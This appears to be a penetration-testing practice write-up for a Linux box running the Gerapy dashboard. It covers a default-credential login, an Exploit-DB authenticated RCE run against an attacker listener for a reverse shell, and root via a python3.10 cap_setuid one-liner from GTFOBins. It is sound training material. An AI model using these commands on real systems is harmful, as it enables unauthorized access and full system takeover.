
## Overview

**Platform:** OSCP-style practice box **Operating System:** Linux **Web Application:** Gerapy (Python crawler management dashboard) **Initial Access:** Default creds → authenticated RCE (Exploit-DB 50640), requiring an understanding of the app's execution flow to actually trigger **Initial Access Type:** Web application exploitation **Privilege Escalation:** `cap_setuid` capability on `/usr/bin/python3.10` **Final Access:** Root

### Key Techniques

- Nmap service enumeration
- Default credential login
- Exploit-DB PoC usage
- Debugging a "silent failure" exploit by understanding app behavior, not just retrying payloads
- `sudo -l` and SUID enumeration (dead end)
- `getcap` — Linux capability enumeration
- GTFOBins `cap_setuid` technique

---

# Attack Path

```text
Nmap: 22, 8000
        ↓
Gerapy Web Panel on :8000
        ↓
Default Creds (admin:admin)
        ↓
Exploit-DB 50640 — Authenticated RCE
        ↓
First Run: Silent Failure (No Callback, No Error)
        ↓
Root Cause: Gerapy Only Triggers Builds Within a Project Context
        ↓
Create Dummy Project via Web UI
        ↓
Re-Run Exploit — Reverse Shell Received
        ↓
sudo -l / SUID Search — Both Dead Ends
        ↓
getcap -r / — Finds cap_setuid on /usr/bin/python3.10
        ↓
GTFOBins Python cap_setuid Technique
        ↓
Root Shell
```

---

# 1. Nmap Enumeration

```bash
nmap -sC -sV -p- $IP --open
```

```text
22/tcp    ssh
8000/tcp  http   Gerapy
```

Gerapy is a web-based management dashboard for Scrapy crawler projects — an internal tool that, per this box's premise, "accidentally made it public."

---

# 2. Foothold — Default Credentials

```text
admin:admin
```

Logged in without resistance.

> [!tip] Key Principle Default creds aren't just a CTF trope — they're a recurring real-world finding on CI/CD dashboards, forgotten staging servers, and internal tools that end up exposed to the perimeter. Always try the obvious default before anything else, on every login form encountered.

---

# 3. Exploitation — Authenticated RCE (Exploit-DB 50640)

```bash
searchsploit -m python/remote/50640.py
```

```bash
python3 50640.py --target $RHOST -p 8000 -L $LHOST -P 4444
```

**First attempt: complete silence.** No callback, no error message — nothing to indicate what went wrong.

## Diagnosing the silent failure

Rather than assuming the exploit was broken or blindly tweaking payload parameters, investigated _why_ Gerapy might not be triggering the vulnerable code path. Found that **Gerapy only executes builds within the context of an existing project** — with no project created, there's nothing for the exploit's build-trigger request to act on, so the vulnerable code path is simply never reached. The exploit script itself was working correctly the whole time; the _application state_ wasn't set up to make the vulnerable path reachable.

**Fix:** create a dummy project through the web UI first (just a name — no actual crawler code needed):

```bash
rlwrap nc -lvnp 4444
python3 50640.py --target $RHOST -p 8000 -L $LHOST -P 4444
```

Reverse shell received. First flag retrieved.

> [!tip] Key Principle When an exploit produces no callback and no error, that silence is itself a clue — it usually means the vulnerable code path was never reached, not that the payload is malformed. Before touching the payload, ask what _application state_ the vulnerability depends on (an existing record, a specific config flag, a resource that must exist first) and whether your target currently satisfies it. "The exploit doesn't work" is often actually "the preconditions for the exploit aren't met yet."

> [!tip] Authenticated RCE Is Still High-Impact "Needs authentication" gets dismissed too readily — the real question is always _how hard is it to get those creds_. When the answer is `admin:admin`, an "authenticated-only" RCE is functionally almost as dangerous as an unauthenticated one.

---

# 4. Privilege Escalation

## Standard checks — dead ends

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Neither turned up anything usable.

## Linux capabilities — the actual path

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/python3.10 = cap_setuid+ep
```

`python3.10` has the **`cap_setuid`** Linux capability set — meaning the binary can change its process's UID (including to 0/root) without needing the SUID bit or sudo at all. This is a completely separate privilege mechanism from both SUID permissions and sudoers rules, and neither `sudo -l` nor a SUID search will ever reveal it.

**Exploitation** (per [GTFOBins — python capabilities entry](https://gtfobins.github.io/gtfobins/python/#capabilities)):

```bash
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
whoami
# root
cat /root/root.txt
```

> [!warning] Capabilities Are Invisible to SUID/Sudo Checks Linux capabilities are a distinct privilege-delegation mechanism from both the SUID bit and sudoers rules — a binary with `cap_setuid` (or other dangerous capabilities like `cap_setgid`, `cap_dac_override`, `cap_sys_admin`) grants exactly the power its name implies, entirely independent of sudo or SUID. If `sudo -l` and a SUID search both come up empty, **that is not the end of privesc enumeration** — `getcap -r / 2>/dev/null` needs to be run as a mandatory next step, not an afterthought.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Internal-facing dashboard/tool exposed externally|Try default creds immediately|
|Exploit runs with no callback and no error|Consider missing application state/preconditions before touching the payload|
|CVE/exploit says "requires authentication"|Check how trivial the required credentials actually are before dismissing impact|
|`sudo -l` and SUID search both come up empty|Run `getcap -r / 2>/dev/null` — capabilities are a separate privilege mechanism entirely|
|A binary shows `cap_setuid`, `cap_setgid`, or similarly dangerous capability|Check GTFOBins' capabilities section for that binary|

---

# Key Lessons

> [!tip] Silent Exploit Failure Usually Means Unmet Preconditions, Not a Broken Script Before modifying a payload, ask what application state the vulnerability depends on — does a resource need to exist first? Is there a specific mode or config the app needs to be in? Understanding the app's execution flow turns a "failed" exploit into a working one.

> [!tip] Don't Dismiss Authenticated RCE The bar for "authenticated" can be as low as `admin:admin`. Always weigh real-world credential difficulty rather than discounting impact just because a CVE lists a prerequisite.

> [!tip] `getcap` Belongs in Every Post-Exploitation Enumeration Pass SUID and sudo checks do not surface Linux capabilities. Any privesc enumeration routine that stops after `sudo -l` and a SUID search is incomplete — `getcap -r / 2>/dev/null` should be a standing, automatic step, the same way pspy or LinPEAS already are.

> [!tip] Exploits Don't Think — You Do Tools run code, but understanding _why_ a payload succeeds or fails is what actually transfers to new targets. Blindly re-running a script teaches nothing; reading its logic and reasoning about the target's behavior builds real instincts.